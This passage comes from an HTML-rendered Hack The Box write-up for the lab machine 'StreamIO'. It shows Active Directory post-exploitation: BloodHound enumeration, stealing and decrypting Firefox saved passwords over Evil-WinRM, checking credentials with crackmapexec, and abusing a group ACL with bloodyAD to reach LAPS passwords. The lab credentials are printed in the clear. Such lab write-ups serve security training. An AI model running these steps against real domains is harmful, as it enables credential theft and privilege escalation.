<span id="cb18-37">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span>
<span id="cb18-38">SeIncreaseWorkingSetPrivilege Increase a <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">process</span> working <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">set</span> Enabled</span></code></pre></div>
<p>Nothing that’s really out of the ordinary, next check should be <strong>Kerberoast</strong> and <strong>BloodHound</strong>.</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio bloodhound-python <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> nikk37 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'get_dem_girls2@yahoo.com'</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-ns</span> 10.10.11.158 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> streamio.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> all</span>
<span id="cb19-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Found AD domain: streamio.htb</span>
<span id="cb19-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Connecting to LDAP server: dc.streamio.htb</span>
<span id="cb19-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Found 1 domains</span>
<span id="cb19-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Found 1 domains in the forest</span>
<span id="cb19-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Found 1 computers</span>
<span id="cb19-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Connecting to LDAP server: dc.streamio.htb</span>
<span id="cb19-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Found 8 users</span>
<span id="cb19-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Connecting to GC LDAP server: dc.streamio.htb</span>
<span id="cb19-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Found 54 groups</span>
<span id="cb19-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Found 0 trusts</span>
<span id="cb19-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Starting computer enumeration with 10 workers</span>
<span id="cb19-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Querying computer: DC.streamIO.htb</span>
<span id="cb19-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:</span> Done in 00M 05S</span></code></pre></div>
<p>Running the raw query <code>MATCH (u:User {hasspn:true}) RETURN u</code> in Bloodhound we find all users that are Kerberoastable - unfortunatley we only find <code>krbtgt</code> which is default. Analyzing further with BloodHound we can’t find anything of use from <code>nikk37</code>. However searching from the domain (<code>STREAMIO.HTB</code>) and selecting “Shortest Path to Here” we find two interesting users - <code>Martin</code> and <code>JDGODD</code>.</p>
<p><img src="https://exploit.se/posts/2022-08-03-htb-writeup-streamio/images/streamio02.png" class="img-fluid"></p>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>Enumerating the box localy we find that Mozilla Firefox is installed. With the box <a href="https://exploit.se/htb-writeup-hancliffe/">Hancliffe</a> relatively fresh in mind, firefox profiles is something that we love to find.</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb20-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">default</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>release<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span></span>
<span id="cb20-2"></span>
<span id="cb20-3">Mode                LastWriteTime         Length Name</span>
<span id="cb20-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-------------</span>         <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">------</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span></span>
<span id="cb20-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">22</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>   <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">41</span> AM         <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">229376</span> cert9<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">db</span></span>
<span id="cb20-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">22</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>   <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">40</span> AM          <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">98304</span> cookies<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sqlite</span></span>
<span id="cb20-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">22</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>   <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">40</span> AM         <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">294912</span> key4<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">db</span></span>
<span id="cb20-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>a----        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">22</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>   <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">41</span> AM           <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2081</span> logins<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">json</span></span></code></pre></div>
<p>All four files that we need to extract credentials are there. Download them to your local machine, setup a tree structure like the victim and use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a> to extract loot.</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb21-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">default</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>release<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> download C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">default</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>release\cert9<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">db</span></span>
<span id="cb21-2">                                                             </span>
<span id="cb21-3">Info<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> Download successful<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">!</span></span></code></pre></div>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio tree</span>
<span id="cb22-2"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb22-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">├──</span> firefox-loot</span>
<span id="cb22-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">│&nbsp;&nbsp;</span> └── br53rxeg.default-release</span>
<span id="cb22-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">│&nbsp;&nbsp;</span>     ├── cert9.db</span>
<span id="cb22-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">│&nbsp;&nbsp;</span>     ├── cookies.sqlite</span>
<span id="cb22-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">│&nbsp;&nbsp;</span>     ├── key4.db</span>
<span id="cb22-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">│&nbsp;&nbsp;</span>     └── logins.json</span>
<span id="cb22-9"></span>
<span id="cb22-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  firefox_decrypt git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">master</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">✗</span> ./firefox_decrypt.py /htb/streamio/firefox-loot/br53rxeg.default-release </span>
<span id="cb22-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-08-02</span> 16:23:13,335 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> WARNING <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> profile.ini not found in /htb/streamio/firefox-loot/br53rxeg.default-release</span>
<span id="cb22-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022-08-02</span> 16:23:13,335 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> WARNING <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Continuing and assuming <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'/htb/streamio/firefox-loot/br53rxeg.default-release'</span> is a profile location</span>
<span id="cb22-13"></span>
<span id="cb22-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Website:</span>   https://slack.streamio.htb</span>
<span id="cb22-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Username:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'admin'</span></span>
<span id="cb22-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'JDg0dd1s@d0p3cr3@t0r'</span></span>
<span id="cb22-17"></span>
<span id="cb22-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Website:</span>   https://slack.streamio.htb</span>
<span id="cb22-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Username:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'nikk37'</span></span>
<span id="cb22-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'n1kk1sd0p3t00:)'</span></span>
<span id="cb22-21"></span>
<span id="cb22-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Website:</span>   https://slack.streamio.htb</span>
<span id="cb22-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Username:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'yoshihide'</span></span>
<span id="cb22-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'paddpadd@12'</span></span>
<span id="cb22-25"></span>
<span id="cb22-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Website:</span>   https://slack.streamio.htb</span>
<span id="cb22-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Username:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'JDgodd'</span></span>
<span id="cb22-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Password:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'password@12'</span></span></code></pre></div>
<p>None of the found credentials / passwords work over WinRM with neither <code>Martin</code>, <code>JDGODD</code> or <code>Administrator</code>.. Nor are we allowed to execute commands remotely using script blocks:</p>
<div class="sourceCode" id="cb23" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb23-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$user</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'JDgodd'</span></span>
<span id="cb23-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$pass</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'JDg0dd1s@d0p3cr3@t0r'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ConvertTo-SecureString</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>AsPlainText <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Force</span>
<span id="cb23-3"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$creds</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">New-Object</span> System<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Management</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Automation</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PSCredential</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$user</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$pass</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb23-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Invoke-Command</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>ComputerName localhost <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Credential <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$creds</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>ScriptBlock <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span> whoami <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb23-5">Connecting to remote server localhost failed with the following error message <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> Access is denied<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">For</span> more information<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> see the about_Remote_Troubleshooting Help topic<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb23-6"></span>
<span id="cb23-7">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> CategoryInfo          <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> OpenError<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>localhost<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>String<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[],</span> PSRemotingTransportException</span>
<span id="cb23-8">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> FullyQualifiedErrorId <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> AccessDenied<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span>PSSessionStateBroken</span></code></pre></div>
<p>Instead of trial and error with username/password combination like above, we can use crackmapexec to confirm that the creds <code>jdgodd:JDg0dd1s@d0p3cr3@t0r</code> work. However we need to find a way to use them.</p>
<div class="sourceCode" id="cb24" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb24-1">➜ streamio crackmapexec smb <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11.158</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>u jdgodd <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>p <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"JDg0dd1s@d0p3cr3@t0r"</span></span>
<span id="cb24-2">SMB         <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11.158</span>    <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">445</span>    DC               <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[*]</span> Windows <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.0</span> Build <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">17763</span> x64 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>name<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>DC<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>domain<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>streamIO<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>signing<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>True<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>SMBv1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>False<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb24-3">SMB         <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11.158</span>    <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">445</span>    DC               <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[+]</span> streamIO<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span>\jdgodd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>JDg0dd1s@d0p3cr3@t0r </span></code></pre></div>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>In BloodHound we saw that <code>JDGODD</code> had <code>WriteOwner</code> rights to the group <code>CORE STAFF@STREAMIO.HTB</code>. Looking on the ACL attack graph, below, we need to change the rights to <code>WriteDACL</code> and then <code>GenericAll</code>. With <code>GenericAll</code> we are allowed to add members to a group, and in this case we saw earlier that <code>CORE STAFF</code> group is allowed to read LAPS password - meaning Administrator access.</p>
<p><img src="https://exploit.se/assets/images/acl-attack-graph.png" class="img-fluid"></p>
<p><img src="https://exploit.se/posts/2022-08-03-htb-writeup-streamio/images/streamio03.png" class="img-fluid"></p>
<div class="sourceCode" id="cb25" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Get WriteDACL</span></span>
<span id="cb25-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  bloodyAD git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./bloodyAD.py</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> streamio.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> jdgodd <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> 10.10.11.158 setOwner JDGODD <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"CORE STAFF"</span></span>
<span id="cb25-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> JDGODD SID is: S-1-5-21-1470860369-1569627196-4264678630-1104</span>
<span id="cb25-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Old owner S-1-5-21-1470860369-1569627196-4264678630-1104 is now replaced by JDGODD on CORE STAFF</span>
<span id="cb25-5"></span>
<span id="cb25-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## GenericAll</span></span>
<span id="cb25-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  bloodyAD git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./bloodyAD.py</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> streamio.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> jdgodd <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> 10.10.11.158 setGenericAll JDGODD <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"CORE STAFF"</span></span>
<span id="cb25-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> JDGODD SID is: S-1-5-21-1470860369-1569627196-4264678630-1104</span>
<span id="cb25-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> JDGODD can now write the attributes of CORE STAFF</span>
<span id="cb25-10"></span>
<span id="cb25-11"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Add JDGODD to Core Staff group</span></span>
<span id="cb25-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  bloodyAD git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./bloodyAD.py</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> streamio.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> jdgodd <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"JDg0dd1s@d0p3cr3@t0r"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> 10.10.11.158 getObjectAttributes  <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"CORE STAFF"</span> member</span>
<span id="cb25-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb25-14">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"member"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> []</span>
<span id="cb25-15"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span></code></pre></div>
